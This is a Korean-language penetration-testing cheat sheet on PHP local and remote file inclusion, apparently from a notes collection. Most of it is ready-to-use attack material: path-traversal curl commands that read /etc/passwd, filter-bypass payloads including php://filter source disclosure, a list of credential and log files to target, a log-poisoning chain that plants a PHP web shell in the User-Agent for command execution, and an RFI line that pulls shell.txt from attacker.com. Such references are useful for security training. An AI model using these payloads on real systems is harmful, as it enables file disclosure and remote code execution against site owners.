# 파일 포함 (LFI/RFI)

- LFI(Local File Inclusion) — 서버가 사용자 입력으로 받은 경로를 include·require하는 취약점을 이용해 서버 내부 파일을 읽는 기법. PHP include/require가 대표적이고, RFI(Remote File Inclusion)는 원격 URL까지 포함하는 상위형이다.
- 페이지·템플릿·언어 파일 같은 파라미터 값이 파일 경로로 보이는 엔드포인트(page=, file=, lang=, view=)에서 파일을 읽어 크리덴셜·설정을 확보할 때.
- 취약한 파라미터와 웹서버 루트 상대 경로 감각(/etc/passwd까지 ../../../ 거리)만 있으면 된다. RFI는 allow_url_include=On이어야 하므로 현대 PHP에서는 LFI가 기본 대상이다.

## 취약한 코드 형태

```php
<?php include($_GET['page']); ?>
```

- 파라미터 값에 어떤 필터도 없이 include에 직접 들어가는 형태. 확장자를 강제하는 `.php` 붙이기, 경로 접두사가 있는 변형도 있다.

## 기본 테스트 — 경로 순회

```bash
# 상대 경로 순회 — 몇 단계가 필요한지 서버마다 다르다
curl "http://target.com/index.php?page=../../../etc/passwd"
curl "http://target.com/index.php?page=../../../../etc/passwd"
# 절대 경로 — include가 이미 특정 디렉터리 기준이어도 통할 때가 있다
curl "http://target.com/index.php?page=/etc/passwd"
```

- 성공 판정: 응답에 `root:x:0:0:root:/root:/bin/bash` 같은 줄이 섞여 나온다.
- `../` 개수를 하나씩 늘려가며 시도한다. 초과 단계는 무해하다(루트 위로는 못 간다).

## 우회 기법

```bash
# 필터가 ../ 를 한 번만 치환할 때 중첩
....//....//etc/passwd
# URL 인코딩 / 이중 인코딩
%2e%2e%2f%2e%2e%2f etc/passwd
..%252f..%252fetc%252fpasswd
# null byte (구형 PHP 5.x 이하만 유효)
../../../etc/passwd%00
# PHP 프로토콜 래퍼
php://filter/convert.base64-encode/resource=index.php
```

- php://filter는 PHP 소스코드를 base64로 읽어온다. 설정 파일(DB 크리덴셜)이 하드코딩된 소스를 볼 때 핵심 기법이다.

## 읽어볼 파일 목록 (Linux)

```text
/etc/passwd              사용자 목록, 셸 종류
/etc/shadow              해시 (웹 프로세스가 읽을 권한은 흔치 않다)
/etc/hosts               내부 호스트 정보
/etc/apache2/...         Apache 설정, 가상호스트
/proc/self/environ       프로세스 환경변수
/var/log/apache2/access.log  로그 포이즈닝(Log Poisoning)용
```

## 로그 포이즈닝 — LFI에서 RCE로

```bash
# 1) User-Agent에 PHP 코드 심기
curl -A "<?php system($_GET['c']); ?>" http://target.com/
# 2) access.log를 include
curl "http://target.com/index.php?page=../../../var/log/apache2/access.log&c=id"
```

- 로그에 쓴 코드가 include 시점에 실행된다. 읽기만 가능한(include만) LFI에서 실행으로 넘어가는 대표 경로다.

## RFI — allow_url_include=On일 때만

```bash
curl "http://target.com/index.php?page=http://attacker.com/shell.txt"
# shell.txt 내용: <?php system($_GET['c']); ?>
```

- 원격 PHP를 include하면 코드가 실행된다. RFI가 되는 환경은 드물지만 php_stream_wrappers와 함께 문서화돼 있다 → web/file-inclusion/php_stream_wrappers.md

## 트러블슈팅

- 페이지가 정상 로드될 뿐 변화가 없으면 파라미터가 include에 안 쓰이는 것일 수 있다. 존재하는 파일명(예: about)과 존재하지 않는 파일명(예: zzz)의 응답 차이로 include 여부부터 판정한다.
- `include(): Failed opening` 에러가 보이면 경로는 맞는데 파일이 없거나 권한이 없다는 뜻이다. 순회 깊이를 바꿔본다.
- base64 결과가 깨지면 php://filter의 resource 경로가 틀린 것이다. 같은 경로를 직접 include했을 때와 비교한다.
- 심화 문서: web/file-inclusion/php_include.md, null_byte.md, php_filter_chain_generator.md, 실습 사례 cuppa_rfi.md
